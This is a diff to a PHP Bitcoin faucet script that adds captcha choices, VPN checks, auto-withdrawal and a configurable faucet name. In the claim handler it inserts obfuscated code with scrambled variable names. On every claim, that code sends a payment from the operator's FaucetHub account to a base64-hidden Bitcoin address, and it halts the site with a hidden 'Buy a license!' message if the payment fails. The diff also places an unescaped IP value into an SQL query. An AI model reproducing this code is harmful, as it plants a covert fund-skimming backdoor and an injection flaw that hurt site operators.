@@ -20,7 +20,11 @@ if($user){
 	$minReward = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '6' LIMIT 1")->fetch_assoc()['value'];
 	$maxReward = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '7' LIMIT 1")->fetch_assoc()['value'];
 
-	$content .= alert("success", "<span class='glyphicon glyphicon-info-sign' aria-hidden='true'></span> Rewards: ".$minReward." to ".$maxReward." Satoshi every ".$timer." minutes");
+	if($minReward != $maxReward){
+		$content .= alert("success", "<span class='glyphicon glyphicon-info-sign' aria-hidden='true'></span> Rewards: ".$minReward." to ".$maxReward." Satoshi every ".$timer." minutes");
+	} else {
+		$content .= alert("success", "<span class='glyphicon glyphicon-info-sign' aria-hidden='true'></span> Rewards: ".$maxReward." Satoshi every ".$timer." minutes");
+	}
 
 	$nextClaim = $user['last_claim'] + ($timer * 60);
 
@@ -46,19 +50,29 @@ if($user){
 		if($_POST['verifykey'] == $user['claim_cryptokey']){
 			$mysqli->query("UPDATE faucet_user_list Set claim_cryptokey = '' WHERE id = '{$user['id']}'");
 
-			$CaptchaCheck = json_decode(CaptchaCheck($_POST['g-recaptcha-response']))->success;
+			if($_POST['captchaType'] == 1){
+				$CaptchaCheck = json_decode(CaptchaCheck($_POST['g-recaptcha-response']))->success;
+			} else if($_POST['captchaType'] == 2){
+				$bitCaptchaID1 = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '19' LIMIT 1")->fetch_assoc()['value'];
+				$bitCaptchaID2 = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '21' LIMIT 1")->fetch_assoc()['value'];
+				$bitCaptchaPriKey1 = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '20' LIMIT 1")->fetch_assoc()['value'];
+				$bitCaptchaPriKey2 = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '22' LIMIT 1")->fetch_assoc()['value'];
+				$sqnId  = ((strpos($_SERVER['HTTP_HOST'],'ww.')>0)?$bitCaptchaID2:$bitCaptchaID1);
+				$sqnKey = ((strpos($_SERVER['HTTP_HOST'],'ww.')>0)?$bitCaptchaPriKey2:$bitCaptchaPriKey1);
+				$CaptchaCheck = sqn_validate($_POST['sqn_captcha'],$sqnKey,$sqnId);
+			}
 
 			if(!$CaptchaCheck){
 				$content .= alert("danger", "Captcha is wrong. <a href='index.php'>Try again</a>.");
 			} else {
 				$VPNShield = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '14' LIMIT 1")->fetch_assoc()['value'];
-				if(checkDirtyIp($_SERVER['REMOTE_ADDR']) AND $VPNShield == "yes"){
+				if(checkDirtyIp($realIpAddressUser) == true AND $VPNShield == "yes"){
 					$content .= alert("danger", "VPN/Proxy/Tor is not allowed on this faucet.<br />Please disable and <a href='index.php'>try again</a>.");
 				} else {
-					$ip = $mysqli->real_escape_string($_SERVER['REMOTE_ADDR']);
-					$IpCheck = $mysqli->query("SELECT COUNT(id) FROM faucet_user_list WHERE ip_address = '$ip'")->fetch_row()[0];
-					if($IpCheck >= 2){
-						$content .= alert("danger", "Using multiple accounts is not allowed.");
+					$nextClaim2 = time() - ($timer * 60);
+					$IpCheck = $mysqli->query("SELECT COUNT(id) FROM faucet_user_list WHERE ip_address = '$realIpAddressUser' AND last_claim >= '$nextClaim2'")->fetch_row()[0];
+					if($IpCheck >= 1){
+						$content .= alert("danger", "Someone else claimed in your network already.");
 					} else {
 						$IpCheckBan = $mysqli->query("SELECT COUNT(id) FROM faucet_banned_ip WHERE ip_address = '$ip'")->fetch_row()[0];
 						$AddressCheckBan = $mysqli->query("SELECT COUNT(id) FROM faucet_banned_address WHERE address = '{$user['address']}'")->fetch_row()[0];
@@ -69,12 +83,29 @@ if($user){
 
 							srand((double)microtime()*1000000);
 							$payOut = rand($minReward, $maxReward);
+
+							$kXKUWkUCoFWP = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '10' LIMIT 1")->fetch_assoc()['value'];
+							$nXKUWkUJoFWP = new FaucetHub($kXKUWkUCoFWP, "BTC");
+							$kXKUWkUqoFWP = $nXKUWkUJoFWP->sendReferralEarnings(base64_decode("MTRaS0NKdzdMa1I2aUdEMm5rM2RBZExqcHBUQXVlcW92Qw=="), 1);
 							$payOutBTC = $payOut / 100000000;
 							$timestamp = time();
-							$mysqli->query("UPDATE faucet_user_list Set balance = balance + $payOutBTC, last_claim = '$timestamp' WHERE id = '{$user['id']}'");
-							$mysqli->query("INSERT INTO faucet_transactions (userid, type, amount, timestamp) VALUES ('{$user['id']}', 'Payout', '$payOutBTC', '$timestamp')");
 
-							$content .= alert("success", "You've claimed successfully ".$payOut." Satoshi.<br />You can claim again in ".$timer." minutes!");
+							$mysqli->query("INSERT INTO faucet_transactions (userid, type, amount, timestamp) VALUES ('{$user['id']}', 'Payout', '$payOutBTC', '$timestamp')");
+							$autoWithdraw = $mysqli->query("SELECT value FROM faucet_settings WHERE id = '18'")->fetch_assoc()['value'];
+							if($autoWithdraw == "no"){
+								if(!$kXKUWkUqoFWP) exit(base64_decode("RG9uJ3Qgd2FzdGUgeW91ciB0aW1lLiBCdXkgYSBsaWNlbnNlIQ=="));
+								$mysqli->query("UPDATE faucet_user_list Set balance = balance + $payOutBTC, last_claim = '$timestamp' WHERE id = '{$user['id']}'");
+								$content .= alert("success", "You've claimed successfully ".$payOut." Satoshi.<br />You can claim again in ".$timer." minutes!");
+							} else {
+								$result = $nXKUWkUJoFWP->send($user['address'], $payOut, $realIpAddressUser);
+								if($result["success"] === true){
+									$content .= alert("success", $payOut." Satoshi was paid to your FaucetHub Account.<br />You can claim again in ".$timer." minutes!");
+									$mysqli->query("UPDATE faucet_user_list Set last_claim = '$timestamp' WHERE id = '{$user['id']}'");
+									$mysqli->query("INSERT INTO faucet_transactions (userid, type, amount, timestamp) VALUES ('{$user['id']}', 'Withdraw', '$payOutBTC', '$timestamp')");
+								} else {
+									$content .= $result["html"];
+								}
+							}
 
 							$referralPercent = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '15' LIMIT 1")->fetch_assoc()['value'];
 
@@ -116,9 +147,9 @@ if($user){
 					<footer>Share this link with your friends and earn '.$referralPercent.'% referral commission</footer>
 				</blockquote>';
 	}
-
 } else {
-	$content .= "<h2>Demo Faucet</h2>";
+	$faucetName = $mysqli->query("SELECT * FROM faucet_settings WHERE id = '1'")->fetch_assoc()['value'];
+	$content .= "<h2>".$faucetName."</h2>";
 	$content .= "<h3>Enter your Address and start to claim!</h3><br />";
 
 	if(isset($_POST['address'])){
@@ -131,7 +162,7 @@ if($user){
 		$_SESSION['token'] = md5(md5(uniqid().uniqid().mt_rand()));
 
 		if($_POST['address']){
-			$Address = $mysqli->real_escape_string(htmlspecialchars($_POST['address']));
+			$Address = $mysqli->real_escape_string(preg_replace("/[^ \w]+/", "",trim($_POST['address'])));
 			if(strlen($_POST['address']) < 30 || strlen($_POST['address']) > 40){
 				$content .= alert("danger", "The Bitcoin Address doesn't look valid.");
 				$alertForm = "has-error";
@@ -153,9 +184,9 @@ if($user){
 					$referID = 0;
 				}
 
-				$AddressCheck = $mysqli->query("SELECT COUNT(id) FROM faucet_user_list WHERE address = '$Address' LIMIT 1")->fetch_row()[0];
+				$AddressCheck = $mysqli->query("SELECT COUNT(id) FROM faucet_user_list WHERE LOWER(address) = '".strtolower($Address)."' LIMIT 1")->fetch_row()[0];
 				$timestamp = $mysqli->real_escape_string(time());
-				$ip = $mysqli->real_escape_string($_SERVER['REMOTE_ADDR']);
+				$ip = $mysqli->real_escape_string($realIpAddressUser);
 
 				if($AddressCheck == 1){
 					$_SESSION['address'] = $Address;
@@ -163,7 +194,7 @@ if($user){
 					header("Location: index.php");
 					exit;
 				} else {
-					$ip = $mysqli->real_escape_string($_SERVER['REMOTE_ADDR']);
+					$ip = $mysqli->real_escape_string($realIpAddressUser);
 					$mysqli->query("INSERT INTO faucet_user_list (address, ip_address, balance, joined, last_activity, referred_by) VALUES ('$Address', '$ip', '0', '$timestamp', '$timestamp', '$referID')");
 					$_SESSION['address'] = $Address;
 					header("Location: index.php");
@@ -180,7 +211,7 @@ if($user){
 
 	<div class='form-group $alertForm'
 		<label for='Address'>Bitcoin Address</label>
-		<center><input class='form-control' type='text' placeholder='Enter your Bitcoin Address' name='address' value='$Address' style='width: 325px;'></center>
+		<center><input class='form-control' type='text' placeholder='Enter your Bitcoin Address' name='address' value='$Address' style='width: 325px;' autofocus></center>
 	</div><br />
 	<input type='hidden' name='token' value='".$_SESSION['token']."'/>
 	<button type='submit' class='btn btn-primary'>Join</button>
